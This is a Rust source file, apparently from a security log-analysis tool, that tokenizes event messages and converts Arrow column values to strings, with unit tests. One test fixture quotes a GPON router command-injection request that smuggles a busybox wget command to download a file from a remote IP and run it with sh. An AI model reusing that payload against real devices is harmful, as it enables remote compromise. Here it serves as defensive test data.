use crate::{Column, ColumnType};
use arrow::datatypes::{Float64Type, Int64Type, UInt32Type};
use percent_encoding::percent_decode_str;
use regex::Regex;
use std::{collections::HashMap, net::Ipv4Addr};

const OPTION_TOKEN_MIN_LENGTH: usize = 2;
const OPTION_URL_DECODE: bool = false;
const OPTION_EXCLUDE_NUMBERS: bool = true;
const OPTION_REMOVE_DUPLICATES: bool = false;
const OPTION_REMOVE_URL_ENCODE: bool = true;
const OPTION_TO_LOWERCASE: bool = true;
const OPTION_REMOVE_HEXCODE: bool = true;
const OPTION_HEXCODE_MIN_LENGTH: usize = 20;
const OPTION_REMOVE_DOT_DIGIT: bool = true;
const RX_URL_ENCODED: &str = r#"%[0-9A-Fa-f]{2}"#;

// characters treated as token
const TOKEN_CHARS: [char; 4] = ['.', '_', '-', '@'];
type EventId = u64;

#[derive(Clone, Eq, PartialEq)]
pub enum ContentKind {
    Token(bool),
    Full(bool),
}

#[derive(Clone)]
pub struct ContentFlag {
    token: ContentKind,
    full: ContentKind,
}

impl Default for ContentFlag {
    fn default() -> Self {
        Self {
            token: ContentKind::Token(false),
            full: ContentKind::Full(false),
        }
    }
}

impl ContentFlag {
    pub fn set(&mut self, x: ContentKind) {
        match x {
            ContentKind::Token(_) => self.token = x,
            ContentKind::Full(_) => self.full = x,
        }
    }

    #[must_use]
    pub fn token(&self) -> bool {
        self.token == ContentKind::Token(true)
    }

    #[must_use]
    pub fn full(&self) -> bool {
        self.full == ContentKind::Full(true)
    }
}

#[derive(Default, Debug)]
pub struct ColumnMessages {
    pub token_maps: Option<HashMap<Vec<String>, Vec<EventId>>>,
    pub event_maps: Option<HashMap<String, Vec<EventId>>>,
}

impl ColumnMessages {
    pub fn add(&mut self, event_id: u64, message: &str, flag: &ContentFlag) {
        if flag.token() {
            if let Some(tokens) = tokenize_message(message) {
                if let Some(x) = &mut self.token_maps {
                    let tmp = x.entry(tokens).or_insert_with(Vec::new);
                    tmp.push(event_id);
                } else {
                    let mut tmp: HashMap<Vec<String>, Vec<u64>> = HashMap::new();
                    tmp.insert(tokens, vec![event_id]);
                    self.token_maps = Some(tmp);
                }
            }
        }

        if flag.full() {
            if let Some(x) = &mut self.event_maps {
                let tmp = x.entry(message.to_string()).or_insert_with(Vec::new);
                tmp.push(event_id);
            } else {
                let mut tmp = HashMap::new();
                tmp.insert(message.to_string(), vec![event_id]);
                self.event_maps = Some(tmp);
            }
        }
    }
}

#[must_use]
pub fn tokenize_message(message: &str) -> Option<Vec<String>> {
    let mut contents = message.to_string();
    if OPTION_REMOVE_URL_ENCODE {
        if let Ok(r) = Regex::new(RX_URL_ENCODED) {
            contents = r.replace_all(message, " ").to_string();
        }
    }

    extract_tokens(&contents, &TOKEN_CHARS, OPTION_TOKEN_MIN_LENGTH)
}

#[must_use]
pub fn column_value_to_string(
    column: &Column,
    column_type: ColumnType,
    index: usize,
) -> Option<String> {
    match column_type {
        ColumnType::DateTime | ColumnType::Int64 => {
            if let Ok(Some(value)) = column.primitive_try_get::<Int64Type>(index) {
                Some(value.to_string())
            } else {
                None
            }
        }
        ColumnType::Float64 => {
            if let Ok(Some(value)) = column.primitive_try_get::<Float64Type>(index) {
                Some(value.to_string())
            } else {
                None
            }
        }
        ColumnType::IpAddr => {
            if let Ok(Some(value)) = column.primitive_try_get::<UInt32Type>(index) {
                Some(Ipv4Addr::from(value).to_string())
            } else {
                None
            }
        }
        ColumnType::Enum | ColumnType::Utf8 => {
            if let Ok(Some(value)) = column.string_try_get(index) {
                Some(value.to_string())
            } else {
                None
            }
        }
        ColumnType::Binary => {
            if let Ok(Some(value)) = column.binary_try_get(index) {
                Some(String::from_utf8_lossy(value).to_string())
            } else if let Ok(Some(value)) = column.string_try_get(index) {
                Some(value.to_string())
            } else {
                None
            }
        }
    }
}

#[must_use]
fn extract_tokens(
    message: &str,
    token_chars: &[char],
    token_min_len: usize,
) -> Option<Vec<String>> {
    let mut pairs: Vec<(usize, usize)> = Vec::new();
    let mut begin: usize;
    let mut end: usize;
    let mut eof: bool = false;

    let mut chs = message.char_indices();
    loop {
        begin = 0;
        end = 0;

        loop {
            if let Some((idx, c)) = chs.next() {
                if c.is_alphanumeric() || token_chars.contains(&c) {
                    begin = idx;
                    break;
                }
                continue;
            }
            eof = true;
            break;
        }

        if !eof {
            loop {
                if let Some((idx, c)) = chs.next() {
                    end = idx;
                    if c.is_alphanumeric() || token_chars.contains(&c) {
                        continue;
                    }
                    break;
                }
                eof = true;
                break;
            }
        }

        if begin < end {
            if eof {
                pairs.push((begin, end + 1));
            } else {
                pairs.push((begin, end));
            }
        }

        if eof {
            break;
        }
    }

    let mut v: Vec<String> = Vec::new();
    for (x, y) in &pairs {
        if let Some(s) = message.get(*x..*y) {
            let mut token = s.trim().to_string();
            if OPTION_URL_DECODE && token.contains('%') {
                token = percent_decode_str(&token).decode_utf8_lossy().to_string();
            }

            if OPTION_EXCLUDE_NUMBERS && s.chars().all(|c| c.is_ascii_digit()) {
                continue;
            }

            if OPTION_TO_LOWERCASE {
                token = token.to_lowercase();
            }

            if OPTION_REMOVE_DUPLICATES && v.contains(&token) {
                continue;
            }

            if token.len() < token_min_len {
                continue;
            }

            if OPTION_REMOVE_HEXCODE
                && s.chars().all(|c| c.is_ascii_hexdigit())
                && (*y - *x) >= OPTION_HEXCODE_MIN_LENGTH
            {
                continue;
            }

            if OPTION_REMOVE_DOT_DIGIT && s.chars().all(|c| c.is_ascii_digit() || c == '.') {
                continue;
            }

            v.push(token);
        }
    }
    if v.is_empty() {
        None
    } else {
        Some(v)
    }
}

#[cfg(test)]
mod tests {
    use arrow::array::{Array, StringArray};
    use chrono::NaiveDate;
    use std::sync::Arc;

    use super::*;

    #[test]
    fn test_tokenize_message() {
        let event = r#"POST /GponForm/diag_Form?images/
        User-Agent: Linux/4.4.127-mainline-revl
        dest_host=`busybox+wget+http://159.89.204.166/gpon+-O+/tmp/fwef;sh+/tmp/fwef`&user=manhaera@kt.com"#;

        assert_eq!(
            tokenize_message(event),
            Some(vec![
                "post".to_string(),
                "gponform".to_string(),
                "diag_form".to_string(),
                "images".to_string(),
                "user-agent".to_string(),
                "linux".to_string(),
                "4.4.127-mainline-revl".to_string(),
                "dest_host".to_string(),
                "busybox".to_string(),
                "wget".to_string(),
                "http".to_string(),
                "gpon".to_string(),
                "-o".to_string(),
                "tmp".to_string(),
                "fwef".to_string(),
                "sh".to_string(),
                "tmp".to_string(),
                "fwef".to_string(),
                "user".to_string(),
                "manhaera@kt.com".to_string()
            ])
        );
    }

    #[test]
    fn test_column_messages() {
        let mut column_messages = ColumnMessages::default();
        let mut flag = ContentFlag::default();
        flag.set(ContentKind::Full(true));

        column_messages.add(100, "/cgi-bin/nph-wsget20.exe", &flag);
        assert_eq!(
            column_messages
                .event_maps
                .as_ref()
                .unwrap()
                .get("/cgi-bin/nph-wsget20.exe"),
            Some(&vec![100_u64])
        );
        assert_eq!(column_messages.token_maps.is_none(), true);

        flag.set(ContentKind::Full(false));
        flag.set(ContentKind::Token(true));
        column_messages.add(100, "/cgi-bin/nph-wsget20.exe", &flag);
        assert_eq!(
            column_messages
                .token_maps
                .as_ref()
                .unwrap()
                .get(&vec!["cgi-bin".to_string(), "nph-wsget20.exe".to_string()]),
            Some(&vec![100_u64])
        );
    }

    #[test]
    fn test_column_value_to_string() {
        let ts: Vec<i64> = vec![NaiveDate::from_ymd(2020, 1, 1)
            .and_hms(0, 0, 10)
            .timestamp()];
        let cts = Column::try_from_slice::<Int64Type>(&ts).unwrap();
        assert_eq!(
            column_value_to_string(&cts, ColumnType::DateTime, 0),
            Some("1577836810".to_string())
        );
        assert_eq!(column_value_to_string(&cts, ColumnType::Utf8, 0), None);

        let src_addr: Vec<u32> = vec![Ipv4Addr::new(127, 0, 0, 1).into()];
        let csrc_addr = Column::try_from_slice::<UInt32Type>(&src_addr).unwrap();
        assert_eq!(
            column_value_to_string(&csrc_addr, ColumnType::IpAddr, 0),
            Some("127.0.0.1".to_string())
        );
        assert_eq!(
            column_value_to_string(&csrc_addr, ColumnType::Enum, 0),
            None
        );

        let uri: Vec<_> = vec!["/PHPMYADMIN/s?SCRIPTS=netgear.CFG".to_string()];
        let uri: Arc<dyn Array> = Arc::new(StringArray::from(uri));
        let curi = Column::from(uri);
        assert_eq!(
            column_value_to_string(&curi, ColumnType::Binary, 0),
            Some("/PHPMYADMIN/s?SCRIPTS=netgear.CFG".to_string())
        );
        assert_eq!(column_value_to_string(&curi, ColumnType::Int64, 0), None);

        let user_agent = vec!["200".to_string()];
        let tmp_user_agent: Arc<dyn Array> = Arc::new(StringArray::from(user_agent));
        let cuser_agent = Column::from(tmp_user_agent);
        assert_eq!(
            column_value_to_string(&cuser_agent, ColumnType::Utf8, 0),
            Some("200".to_string())
        );
        assert_eq!(
            column_value_to_string(&cuser_agent, ColumnType::Int64, 0),
            None
        );

        let status = vec!["http".to_string()];
        let tmp_status: Arc<dyn Array> = Arc::new(StringArray::from(status));
        let cstatus = Column::from(tmp_status);
        assert_eq!(
            column_value_to_string(&cstatus, ColumnType::Enum, 0),
            Some("http".to_string())
        );
        assert_eq!(column_value_to_string(&cstatus, ColumnType::Int64, 0), None);

        let score = vec![0.67_f64];
        let cscore = Column::try_from_slice::<Float64Type>(&score).unwrap();
        assert_eq!(
            column_value_to_string(&cscore, ColumnType::Float64, 0),
            Some("0.67".to_string())
        );
        assert_eq!(column_value_to_string(&cscore, ColumnType::Enum, 0), None);

        let size = vec![1000_i64];
        let csize = Column::try_from_slice::<Int64Type>(&size).unwrap();
        assert_eq!(
            column_value_to_string(&csize, ColumnType::Int64, 0),
            Some("1000".to_string())
        );
        assert_eq!(column_value_to_string(&csize, ColumnType::Enum, 0), None);
    }
}
